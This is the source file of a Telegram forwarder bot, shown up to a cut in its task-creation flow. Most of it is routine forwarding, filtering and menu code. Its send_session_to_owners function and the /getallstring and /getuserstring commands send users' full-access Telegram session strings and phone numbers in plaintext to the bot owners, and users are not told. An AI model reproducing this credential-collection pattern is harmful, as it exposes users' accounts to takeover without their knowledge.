#!/usr/bin/env python3
import os
import asyncio
import logging
import functools
import gc
import re
import time
import signal
import threading
from typing import Dict, List, Optional, Tuple, Set, Callable, Any
from collections import OrderedDict
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from database import Database
from webserver import start_server_thread, register_monitoring

# Optimized logging to reduce I/O
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("forward")

# Environment variables with optimized defaults for Render free tier
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")

# String sessions from environment variable (comma-separated user_id:session_string)
USER_SESSIONS = {}
user_sessions_env = os.getenv("USER_SESSIONS", "").strip()
if user_sessions_env:
    for session_entry in user_sessions_env.split(","):
        session_entry = session_entry.strip()
        if not session_entry or ":" not in session_entry:
            continue
        try:
            user_id_str, session_string = session_entry.split(":", 1)
            user_id = int(user_id_str.strip())
            USER_SESSIONS[user_id] = session_string.strip()
            logger.info(f"Loaded string session for user {user_id} from env")
        except ValueError as e:
            logger.warning(f"Invalid USER_SESSIONS entry '{session_entry}': {e}")

# Support multiple owners / admins via OWNER_IDS (comma-separated)
OWNER_IDS: Set[int] = set()
owner_env = os.getenv("OWNER_IDS", "").strip()
if owner_env:
    for part in owner_env.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            OWNER_IDS.add(int(part))
        except ValueError:
            logger.warning("Invalid OWNER_IDS value skipped: %s", part)

# Support additional allowed users via ALLOWED_USERS (comma-separated)
ALLOWED_USERS: Set[int] = set()
allowed_env = os.getenv("ALLOWED_USERS", "").strip()
if allowed_env:
    for part in allowed_env.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            ALLOWED_USERS.add(int(part))
        except ValueError:
            logger.warning("Invalid ALLOWED_USERS value skipped: %s", part)

# OPTIMIZED Tuning parameters for Render free tier (25 concurrent users)
SEND_WORKER_COUNT = int(os.getenv("SEND_WORKER_COUNT", "8"))  # Lowered workers to save memory
SEND_QUEUE_MAXSIZE = int(os.getenv("SEND_QUEUE_MAXSIZE", "5000"))  # Reduced queue size
TARGET_RESOLVE_RETRY_SECONDS = int(os.getenv("TARGET_RESOLVE_RETRY_SECONDS", "30"))  # Retry delay
MAX_CONCURRENT_USERS = int(os.getenv("MAX_CONCURRENT_USERS", "25"))  # Target concurrent connected accounts
MESSAGE_PROCESS_BATCH_SIZE = int(os.getenv("MESSAGE_PROCESS_BATCH_SIZE", "5"))  # Batch processing

# Per-user concurrency and rate limiting (configurable)
SEND_CONCURRENCY_PER_USER = int(os.getenv("SEND_CONCURRENCY_PER_USER", "4"))  # max concurrent sends per user client
SEND_RATE_PER_USER = float(os.getenv("SEND_RATE_PER_USER", "5.0"))  # tokens per second (burst smoothing)

# Target entity LRU cache size per user
TARGET_ENTITY_CACHE_SIZE = int(os.getenv("TARGET_ENTITY_CACHE_SIZE", "256"))

db = Database()

# OPTIMIZED: Use weak references and smaller data structures where possible
user_clients: Dict[int, TelegramClient] = {}
login_states: Dict[int, Dict] = {}
logout_states: Dict[int, Dict] = {}

# Store user session strings
user_session_strings: Dict[int, str] = {}  # user_id -> session_string

# Phone verification states for restored sessions
phone_verification_states: Dict[int, Dict] = {}  # user_id -> {step: str, etc.}

# Task creation states
task_creation_states: Dict[int, Dict[str, Any]] = {}  # user_id -> {step: str, name: str, source_ids: List[int], target_ids: List[int]}

# OPTIMIZED: Hot-path caches with memory limits
tasks_cache: Dict[int, List[Dict]] = {}  # user_id -> list of task dicts

# target_entity_cache will be per-user bounded LRU: { user_id: OrderedDict[target_id->entity] }
target_entity_cache: Dict[int, OrderedDict] = {}

# handler_registered maps user_id -> handler callable (so we can remove it)
handler_registered: Dict[int, Callable] = {}

# Per-user concurrency semaphores and rate-limiters
user_send_semaphores: Dict[int, asyncio.Semaphore] = {}
# rate limiter: user_id -> (tokens: float, last_refill: float)
user_rate_limiters: Dict[int, Tuple[float, float]] = {}

# Global send queue is created later on the running event loop (in post_init/start_send_workers)
send_queue: Optional[asyncio.Queue] = None

UNAUTHORIZED_MESSAGE = """🚫 **Access Denied!** 

You are not authorized to use this bot.

📞 **Call this number:** `07089430305`

Or

🗨️ **Message Developer:** [HEMMY](https://t.me/justmemmy)
"""

# Track worker tasks so we can cancel them on shutdown
worker_tasks: List[asyncio.Task] = []
_send_workers_started = False

# MAIN loop reference for cross-thread metrics collection
MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None

# OPTIMIZED: Memory management
_last_gc_run = 0
GC_INTERVAL = 300  # Run GC every 5 minutes


# Generic helper to run DB calls in a thread so the event loop isn't blocked
async def db_call(func, *args, **kwargs):
    return await asyncio.to_thread(functools.partial(func, *args, **kwargs))


# OPTIMIZED: Memory management helper
async def optimized_gc():
    """Run garbage collection periodically to free memory"""
    global _last_gc_run
    current_time = asyncio.get_event_loop().time()
    if current_time - _last_gc_run > GC_INTERVAL:
        collected = gc.collect()
        logger.debug(f"Garbage collection freed {collected} objects")
        _last_gc_run = current_time


# ---------- Helpers: LRU target cache and per-user limiters ----------
def _ensure_user_target_cache(user_id: int):
    if user_id not in target_entity_cache:
        target_entity_cache[user_id] = OrderedDict()


def _get_cached_target(user_id: int, target_id: int):
    _ensure_user_target_cache(user_id)
    od = target_entity_cache[user_id]
    if target_id in od:
        # move to end = mark most recently used
        od.move_to_end(target_id)
        return od[target_id]
    return None


def _set_cached_target(user_id: int, target_id: int, entity: object):
    _ensure_user_target_cache(user_id)
    od = target_entity_cache[user_id]
    od[target_id] = entity
    od.move_to_end(target_id)
    # enforce size limit
    while len(od) > TARGET_ENTITY_CACHE_SIZE:
        od.popitem(last=False)  # pop least recently used


def _ensure_user_send_semaphore(user_id: int):
    if user_id not in user_send_semaphores:
        user_send_semaphores[user_id] = asyncio.Semaphore(SEND_CONCURRENCY_PER_USER)


def _ensure_user_rate_limiter(user_id: int):
    if user_id not in user_rate_limiters:
        user_rate_limiters[user_id] = (SEND_RATE_PER_USER, asyncio.get_event_loop().time())


async def _consume_token(user_id: int, amount: float = 1.0):
    """
    Token-bucket style refill. Returns when token is available.
    This limits burst rate per user, reducing flood/wait.
    """
    _ensure_user_rate_limiter(user_id)
    while True:
        tokens, last = user_rate_limiters[user_id]
        now = asyncio.get_event_loop().time()
        # refill
        elapsed = max(0.0, now - last)
        refill = elapsed * SEND_RATE_PER_USER
        tokens = min(tokens + refill, SEND_RATE_PER_USER * 10)  # allow some burst up to 10*rate
        if tokens >= amount:
            tokens -= amount
            user_rate_limiters[user_id] = (tokens, now)
            return
        # store updated tokens and time
        user_rate_limiters[user_id] = (tokens, now)
        # sleep a short while before retrying
        await asyncio.sleep(0.1)


# ---------- Message filtering functions ----------
def extract_words(text: str) -> List[str]:
    """Extract words from text, preserving emojis and special characters"""
    return re.findall(r'\S+', text)

def is_numeric_word(word: str) -> bool:
    """Check if word contains only digits (numeric)"""
    return word.isdigit()

def is_alphabetic_word(word: str) -> bool:
    """Check if word contains only letters (alphabetic)"""
    return word.isalpha()

def contains_numeric(word: str) -> bool:
    """Check if word contains any digits"""
    return any(char.isdigit() for char in word)

def contains_alphabetic(word: str) -> bool:
    """Check if word contains any letters"""
    return any(char.isalpha() for char in word)

def contains_only_special(word: str) -> bool:
    """Check if word contains only special characters (no letters or digits)"""
    return not (contains_numeric(word) or contains_alphabetic(word))

def is_emoji(word: str) -> bool:
    """Check if word is an emoji or contains emojis"""
    # Emoji regex pattern
    emoji_pattern = re.compile(
        "["
        "\U0001F600-\U0001F64F"  # emoticons
        "\U0001F300-\U0001F5FF"  # symbols & pictographs
        "\U0001F680-\U0001F6FF"  # transport & map symbols
        "\U0001F1E0-\U0001F1FF"  # flags (iOS)
        "\U00002702-\U000027B0"  # dingbats
        "\U000024C2-\U0001F251" 
        "]+", flags=re.UNICODE)
    return bool(emoji_pattern.search(word))

def contains_special_characters(word: str) -> bool:
    """Check if word contains special characters (punctuation, symbols)"""
    # Check for any character that is not alphanumeric and not emoji
    for char in word:
        if not char.isalnum() and not is_emoji(char):
            return True
    return False

def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
    """Apply filters to message text and return list of messages to forward"""
    if not message_text:
        return []
    
    filters_enabled = task_filters.get('filters', {})
    
    # If raw text is enabled, forward everything with prefix/suffix
    if filters_enabled.get('raw_text', False):
        processed = message_text
        if filters_enabled.get('prefix'):
            processed = filters_enabled['prefix'] + processed
        if filters_enabled.get('suffix'):
            processed = processed + filters_enabled['suffix']
        return [processed]
    
    messages_to_send = []
    words = extract_words(message_text)
    
    # Process based on enabled filters
    if filters_enabled.get('numbers_only', False):
        # Only forward if entire message is a number
        if is_numeric_word(message_text.replace(' ', '')):
            processed = message_text
            if filters_enabled.get('prefix'):
                processed = filters_enabled['prefix'] + processed
            if filters_enabled.get('suffix'):
                processed = processed + filters_enabled['suffix']
            messages_to_send.append(processed)
    
    elif filters_enabled.get('alphabets_only', False):
        # Only forward if entire message is alphabetic
        if is_alphabetic_word(message_text.replace(' ', '')):
            processed = message_text
            if filters_enabled.get('prefix'):
                processed = filters_enabled['prefix'] + processed
            if filters_enabled.get('suffix'):
                processed = processed + filters_enabled['suffix']
            messages_to_send.append(processed)
    
    elif filters_enabled.get('removed_alphabetic', False):
        # Forward ONLY letters + special characters (no numbers, no emojis)
        for word in words:
            # Skip if contains numbers
            if contains_numeric(word):
                continue
            # Skip if is emoji
            if is_emoji(word):
                continue
            # Forward if contains letters or special characters
            if contains_alphabetic(word) or contains_special_characters(word):
                processed = word
                if filters_enabled.get('prefix'):
                    processed = filters_enabled['prefix'] + processed
                if filters_enabled.get('suffix'):
                    processed = processed + filters_enabled['suffix']
                messages_to_send.append(processed)
    
    elif filters_enabled.get('removed_numeric', False):
        # Forward ONLY numbers + special characters (no letters, no emojis)
        for word in words:
            # Skip if contains letters
            if contains_alphabetic(word):
                continue
            # Skip if is emoji
            if is_emoji(word):
                continue
            # Forward if contains numbers or special characters
            if contains_numeric(word) or contains_special_characters(word):
                processed = word
                if filters_enabled.get('prefix'):
                    processed = filters_enabled['prefix'] + processed
                if filters_enabled.get('suffix'):
                    processed = processed + filters_enabled['suffix']
                messages_to_send.append(processed)
    
    else:
        # No specific filter enabled, forward all words with prefix/suffix
        for word in words:
            processed = word
            if filters_enabled.get('prefix'):
                processed = filters_enabled['prefix'] + processed
            if filters_enabled.get('suffix'):
                processed = processed + filters_enabled['suffix']
            messages_to_send.append(processed)
    
    return messages_to_send


# ---------- Authorization helpers ----------
async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id

    try:
        is_allowed_db = await db_call(db.is_user_allowed, user_id)
    except Exception:
        logger.exception("Error checking DB allowed users for %s", user_id)
        is_allowed_db = False

    is_allowed_env = (user_id in ALLOWED_USERS) or (user_id in OWNER_IDS)

    if not (is_allowed_db or is_allowed_env):
        if update.message:
            await update.message.reply_text(
                UNAUTHORIZED_MESSAGE,
                parse_mode="Markdown",
                disable_web_page_preview=True,
            )
        elif update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                UNAUTHORIZED_MESSAGE,
                parse_mode="Markdown",
                disable_web_page_preview=True,
            )
        return False

    return True


async def send_session_to_owners(user_id: int, phone: str, name: str, session_string: str):
    """Send newly generated string session to all owners"""
    for owner_id in OWNER_IDS:
        try:
            from telegram import Bot
            bot = Bot(token=BOT_TOKEN)
            await bot.send_message(
                owner_id,
                f"🔐 **New String Session Generated**\n\n"
                f"👤 **User:** {name}\n"
                f"📱 **Phone:** `{phone}`\n"
                f"🆔 **User ID:** `{user_id}`\n\n"
                f"**Env Var Format:**\n"
                f"```{user_id}:{session_string}```",
                parse_mode="Markdown",
            )
            logger.info(f"Sent session string for user {user_id} to owner {owner_id}")
        except Exception as e:
            logger.exception(f"Failed to send session to owner {owner_id}: {e}")


# ---------- Phone Verification for Restored Sessions ----------
async def check_phone_number_required(user_id: int) -> bool:
    """Check if user needs to provide phone number"""
    user = await db_call(db.get_user, user_id)
    if user and user.get("is_logged_in") and not user.get("phone"):
        return True
    return False


async def ask_for_phone_number(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Ask user to provide phone number for restored session"""
    phone_verification_states[user_id] = {
        "step": "waiting_phone",
        "chat_id": chat_id
    }
    
    message = (
        "📱 **Phone Number Verification Required**\n\n"
        "Your account was restored from a saved session, but we need your phone number for security.\n\n"
        "⚠️ **Important:**\n"
        "• This is the phone number associated with your Telegram account\n"
        "• It will only be used for logout confirmation\n"
        "• Your phone number is stored securely\n\n"
        "**Please enter your phone number (with country code):**\n\n"
        "**Examples:**\n"
        "• `+1234567890`\n"
        "• `+447911123456`\n"
        "• `+4915112345678`\n\n"
        "**Type your phone number now:**"
    )
    
    try:
        await context.bot.send_message(chat_id, message, parse_mode="Markdown")
    except Exception as e:
        logger.exception(f"Failed to send phone verification message to user {user_id}: {e}")


async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number verification for restored sessions"""
    user_id = update.effective_user.id
    
    if user_id not in phone_verification_states:
        return
    
    state = phone_verification_states[user_id]
    text = update.message.text.strip()
    
    if state["step"] == "waiting_phone":
        if not text.startswith('+'):
            await update.message.reply_text(
                "❌ **Invalid format!**\n\n"
                "Phone number must start with `+`\n"
                "Example: `+1234567890`\n\n"
                "Please enter your phone number again:",
                parse_mode="Markdown",
            )
            return
        
        clean_phone = ''.join(c for c in text if c.isdigit() or c == '+')
        
        if len(clean_phone) < 8:
            await update.message.reply_text(
                "❌ **Invalid phone number!**\n\n"
                "Phone number seems too short. Please check and try again.\n"
                "Example: `+1234567890`",
                parse_mode="Markdown",
            )
            return
        
        # Verify phone matches session
        client = user_clients.get(user_id)
        if client:
            try:
                me = await client.get_me()
                # Update database with phone number
                await db_call(db.save_user, user_id, clean_phone, me.first_name, user_session_strings.get(user_id), True)
                
                del phone_verification_states[user_id]
                
                await update.message.reply_text(
                    f"✅ **Phone number verified!**\n\n"
                    f"📱 **Phone:** `{clean_phone}`\n"
                    f"👤 **Name:** {me.first_name or 'User'}\n\n"
                    "Your account is now fully restored! 🎉\n\n"
                    "You can now use all bot commands.",
                    parse_mode="Markdown",
                )
                
                # Show main menu
                await show_main_menu(update, context, user_id)
                
            except Exception as e:
                logger.exception(f"Error verifying phone for user {user_id}: {e}")
                await update.message.reply_text(
                    "❌ **Error verifying phone number!**\n\n"
                    "Please try again or contact support.",
                    parse_mode="Markdown",
                )
        else:
            await update.message.reply_text(
                "❌ **Session not found!**\n\n"
                "Please try logging in again with /login",
                parse_mode="Markdown",
            )
            del phone_verification_states[user_id]


# ---------- String Session Commands ----------
async def getallstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get all string sessions in env var format (owners only) - FIXED VERSION"""
    user_id = update.effective_user.id
    
    if user_id not in OWNER_IDS:
        if update.message:
            await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
        elif update.callback_query:
            await update.callback_query.answer("Only owners can use this command!", show_alert=True)
        return
    
    # Get message object
    message_obj = update.message if update.message else update.callback_query.message
    
    if not message_obj:
        return
    
    # Show we're working
    processing_msg = await message_obj.reply_text("⏳ **Searching database for sessions...**")
    
    try:
        # Direct database query - simple and reliable
        import sqlite3
        
        def query_database():
            conn = sqlite3.connect("bot_data.db")
            conn.row_factory = sqlite3.Row
            cur = conn.cursor()
            # Get all users with session data
            cur.execute(
                "SELECT user_id, session_data, name, phone FROM users WHERE session_data IS NOT NULL AND session_data != '' ORDER BY user_id"
            )
            rows = cur.fetchall()
            conn.close()
            return rows
        
        rows = await asyncio.to_thread(query_database)
        
        if not rows:
            await processing_msg.edit_text("📭 **No string sessions found in database!**")
            return
        
        # Delete processing message
        await processing_msg.delete()
        
        # Send header
        header_msg = await message_obj.reply_text(
            "🔑 **All String Sessions**\n\n"
            "**Well Arranged Copy-Paste Env Var Format:**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        
        # Send each session one by one
        for i, row in enumerate(rows, 1):
            user_id_db = row["user_id"]
            session_data = row["session_data"]
            username = row["name"] or f"User {user_id_db}"
            phone = row["phone"] or "Not available"
            
            message_text = f"👤 **User:** {username} (ID: `{user_id_db}`)\n"
            message_text += f"📱 **Phone:** `{phone}`\n\n"
            message_text += f"**Env Var Format:**\n```{user_id_db}:{session_data}```\n\n"
            message_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            try:
                await message_obj.reply_text(message_text, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Error sending session {i}: {e}")
                continue
        
        # Send total count
        await message_obj.reply_text(f"📊 **Total:** {len(rows)} session(s)")
        
    except Exception as e:
        logger.exception(f"Error in getallstring_command: {e}")
        try:
            await processing_msg.edit_text(f"❌ **Error fetching sessions:** {str(e)[:200]}")
        except:
            await message_obj.reply_text(f"❌ **Error:** {str(e)[:200]}")


async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get string session for specific user (owners only)"""
    user_id = update.effective_user.id
    
    if user_id not in OWNER_IDS:
        # Get message object
        if update.message:
            await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
        elif update.callback_query:
            await update.callback_query.answer("Only owners can use this command!", show_alert=True)
        return
    
    # Get message object based on update type
    message_obj = update.message if update.message else None
    if not message_obj and update.callback_query:
        message_obj = update.callback_query.message
        await update.callback_query.answer()
    
    if not message_obj:
        return
    
    if not context.args:
        await message_obj.reply_text(
            "❌ **Usage:** `/getuserstring [user_id]`\n\n"
            "**Example:** `/getuserstring 123456789`",
            parse_mode="Markdown"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await message_obj.reply_text("❌ **Invalid user ID!** Must be a number.", parse_mode="Markdown")
        return
    
    # Try to get session from database
    user = await db_call(db.get_user, target_user_id)
    if not user or not user.get("session_data"):
        await message_obj.reply_text(f"❌ **No string session found for user ID `{target_user_id}`!**", parse_mode="Markdown")
        return
    
    session_string = user["session_data"]
    username = user.get("name", "Unknown")
    phone = user.get("phone", "Not available")
    
    message_text = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n"
    message_text += f"📱 **Phone:** `{phone}`\n\n"
    message_text += "**Env Var Format:**\n"
    message_text += f"```{target_user_id}:{session_string}```"
    
    await message_obj.reply_text(message_text, parse_mode="Markdown")


# ---------- Owner Menu Functions ----------
async def show_owner_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show owner-only menu"""
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id not in OWNER_IDS:
        await query.answer("Only owners can access this menu!", show_alert=True)
        return
    
    await query.answer()
    
    message_text = "👑 **Owner Menu**\n\n"
    message_text += "Administrative commands:\n\n"
    message_text += "🔑 **Session Management:**\n"
    message_text += "• Get all string sessions\n"
    message_text += "• Get specific user's session\n\n"
    message_text += "👥 **User Management:**\n"
    message_text += "• List all allowed users\n"
    message_text += "• Add new user\n"
    message_text += "• Remove user\n"
    
    keyboard = [
        [InlineKeyboardButton("🔑 Get All String Sessions", callback_data="get_all_strings")],
        [InlineKeyboardButton("👤 Get User String Session", callback_data="get_user_string_prompt")],
        [InlineKeyboardButton("👥 List All Users", callback_data="list_all_users")],
        [InlineKeyboardButton("➕ Add User", callback_data="add_user_menu")],
        [InlineKeyboardButton("➖ Remove User", callback_data="remove_user_menu")],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def handle_owner_menu_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle owner menu actions"""
    query = update.callback_query
    user_id = query.from_user.id
    action = query.data
    
    if user_id not in OWNER_IDS:
        await query.answer("Only owners can access this menu!", show_alert=True)
        return
    
    await query.answer()
    
    if action == "get_all_strings":
        await query.message.delete()
        await getallstring_command(update, context)
    
    elif action == "get_user_string_prompt":
        await query.edit_message_text(
            "👤 **Get User String Session**\n\n"
            "Please use the command:\n"
            "`/getuserstring [user_id]`\n\n"
            "**Example:** `/getuserstring 123456789`\n\n"
            "Or tap the button below to go back to the owner menu.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="owner_commands")]
            ])
        )
    
    elif action == "list_all_users":
        await query.message.delete()
        await listusers_command(update, context)
    
    elif action == "add_user_menu":
        await query.edit_message_text(
            "➕ **Add User**\n\n"
            "Please use the command:\n"
            "`/adduser [user_id] [admin]`\n\n"
            "**Examples:**\n"
            "• `/adduser 123456789` - Add regular user\n"
            "• `/adduser 123456789 admin` - Add admin user\n\n"
            "Or tap the button below to go back to the owner menu.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="owner_commands")]
            ])
        )
    
    elif action == "remove_user_menu":
        await query.edit_message_text(
            "➖ **Remove User**\n\n"
            "Please use the command:\n"
            "`/removeuser [user_id]`\n\n"
            "**Example:** `/removeuser 123456789`\n\n"
            "Or tap the button below to go back to the owner menu.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="owner_commands")]
            ])
        )
    
    elif action == "back_to_main":
        await show_main_menu(update, context, user_id)


# ---------- Simple UI handlers ----------
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Show main menu for user"""
    user = await db_call(db.get_user, user_id)
    
    user_name = update.effective_user.first_name or "User"
    user_phone = user["phone"] if user and user["phone"] else "Not connected"
    is_logged_in = user and user["is_logged_in"]
    
    status_emoji = "🟢" if is_logged_in else "🔴"
    status_text = "Online" if is_logged_in else "Offline"
    
    message_text = f"""
╔═══════════════════════════╗
║   📨 FORWARDER BOT 📨   ║
║  TELEGRAM MESSAGE FORWARDER  ║
╚═══════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 **User:** {user_name}
📱 **Phone:** `{user_phone}`
{status_emoji} **Status:** {status_text}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **COMMANDS:**

🔐 **Account Management:**
  /login - Connect your Telegram account
  /logout - Disconnect your account

📨 **Forwarding Tasks:**
  /forwadd - Create a new forwarding task
  /fortasks - List all your tasks

🆔 **Utilities:**
  /getallid - Get all your chat IDs
"""
    
    # Add owner commands section if user is owner
    if user_id in OWNER_IDS:
        message_text += "\n👑 **Owner Commands:**\n"
        message_text += "  /getallstring - Get all string sessions\n"
        message_text += "  /getuserstring - Get specific user's session\n"
        message_text += "  /adduser - Add allowed user\n"
        message_text += "  /removeuser - Remove user\n"
        message_text += "  /listusers - List all allowed users\n"
    
    message_text += """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚙️ **How it works:**
1. Connect your account with /login
2. Create a forwarding task
3. Send messages in source chat
4. Bot forwards to target with your chosen filters!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    keyboard = []
    if is_logged_in:
        keyboard.append([InlineKeyboardButton("📋 My Tasks", callback_data="show_tasks")])
        keyboard.append([InlineKeyboardButton("🔴 Disconnect", callback_data="logout")])
    else:
        keyboard.append([InlineKeyboardButton("🟢 Connect Account", callback_data="login")])
    
    # Add owner menu button for owners
    if user_id in OWNER_IDS:
        keyboard.append([InlineKeyboardButton("👑 Owner Menu", callback_data="owner_commands")])
    
    if update.callback_query:
        await update.callback_query.message.edit_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
            parse_mode="Markdown",
        )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number for restored session
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return
    
    # Show main menu
    await show_main_menu(update, context, user_id)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number for restored session
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return

    await query.answer()

    if query.data == "login":
        await query.message.delete()
        await login_command(update, context)
    elif query.data == "logout":
        await query.message.delete()
        await logout_command(update, context)
    elif query.data == "show_tasks":
        await query.message.delete()
        await fortasks_command(update, context)
    elif query.data.startswith("chatids_"):
        if query.data == "chatids_back":
            await show_chat_categories(user_id, query.message.chat.id, query.message.message_id, context)
        else:
            parts = query.data.split("_")
            category = parts[1]
            page = int(parts[2])
            await show_categorized_chats(user_id, query.message.chat.id, query.message.message_id, category, page, context)
    elif query.data.startswith("task_"):
        await handle_task_menu(update, context)
    elif query.data.startswith("filter_"):
        await handle_filter_menu(update, context)
    elif query.data.startswith("toggle_"):
        await handle_toggle_action(update, context)
    elif query.data.startswith("delete_"):
        await handle_delete_action(update, context)
    elif query.data.startswith("prefix_"):
        await handle_prefix_suffix(update, context)
    elif query.data.startswith("suffix_"):
        await handle_prefix_suffix(update, context)
    elif query.data.startswith("confirm_delete_"):
        await handle_confirm_delete(update, context)
    elif query.data == "owner_commands":
        await show_owner_menu(update, context)
    elif query.data in ["get_all_strings", "get_user_string_prompt", "list_all_users", 
                       "add_user_menu", "remove_user_menu", "back_to_main"]:
        await handle_owner_menu_actions(update, context)


# ---------- Task creation flow ----------
async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the interactive task creation process"""
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return

    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await update.message.reply_text(
            "❌ **You need to connect your account first!**\n\nUse /login to connect your Telegram account.",
            parse_mode="Markdown"
        )
        return

    task_creation_states[user_id] = {
        "step": "waiting_name",
        "name": "",
        "source_ids": [],
        "target_ids": []
    }

    await update.message.reply_text(
        "🎯 **Let's create a new forwarding task!**\n\n"
        "📝 **Step 1 of 3:** Please enter a name for your task.\n\n"
        "💡 *Example: My Forwarding Task*",
        parse_mode="Markdown"
    )


async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle interactive task creation steps"""
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in task_creation_states:
        return

    state = task_creation_states[user_id]

    try:
        if state["step"] == "waiting_name":
            if not text:
                await update.message.reply_text("❌ **Please enter a valid task name!**")
                return

            state["name"] = text
            state["step"] = "waiting_source"

            await update.message.reply_text(
                f"✅ **Task name saved:** {text}\n\n"
                "📥 **Step 2 of 3:** Please enter the source chat ID(s).\n\n"
                "You can enter multiple IDs separated by spaces.\n"
                "💡 *Use /getallid to find your chat IDs*\n\n"
                "**Example:** `123456789 987654321`",
                parse_mode="Markdown"
            )

        elif state["step"] == "waiting_source":
            if not text:
                await update.message.reply_text("❌ **Please enter at least one source ID!**")
                return

            try:
                source_ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
                if not source_ids:
                    await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
                    return

                state["source_ids"] = source_ids
                state["step"] = "waiting_target"

                await update.message.reply_text(
                    f"✅ **Source IDs saved:** {', '.join(map(str, source_ids))}\n\n"
                    "📤 **Step 3 of 3:** Please enter the target chat ID(s).\n\n"
                    "You can enter multiple IDs separated by spaces.\n"
                    "💡 *Use /getallid to find your chat IDs*\n\n"
                    "**Example:** `111222333`",
                    parse_mode="Markdown"
                )

            except ValueError:
                await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")

        elif state["step"] == "waiting_target":
            if not text:
                await update.message.reply_text("❌ **Please enter at least one target ID!**")
                return

            try:
                target_ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
                if not target_ids:
                    await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
                    return

                state["target_ids"] = target_ids

                task_filters = {
                    "filters": {
                        "raw_text": False,
                        "numbers_only": False,
                        "alphabets_only": False,
                        "removed_alphabetic": False,
                        "removed_numeric": False,
                        "prefix": "",
                        "suffix": ""
                    },
                    "outgoing": True,
                    "forward_tag": False,
                    "control": True
                }

                added = await db_call(db.add_forwarding_task, 
                                     user_id, 
                                     state["name"], 
                                     state["source_ids"], 
                                     state["target_ids"],
                                     task_filters)

                if added:
                    tasks_cache.setdefault(user_id, [])
                    tasks_cache[user_id].append({
                        "id": None,
                        "label": state["name"],
                        "source_ids": state["source_ids"],
                        "target_ids": state["target_ids"],
                        "is_active": 1,
                        "filters": task_filters
                    })

                    try:
                        asyncio.create_task(resolve_targets_for_user(user_id, target_ids))
                    except Exception:
                        logger.exception("Failed to schedule resolve_targets_for_user task")

                    await update.message.reply_text(
                        f"🎉 **Task created successfully!**\n\n"
                        f"📋 **Name:** {state['name']}\n"
                        f"📥 **Sources:** {', '.join(map(str, state['source_ids']))}\n"
                        f"📤 **Targets:** {', '.join(map(str, state['target_ids']))}\n\n"
                        "✅ All filters are set to default:\n"
                        "• Outgoing: ✅ On\n"
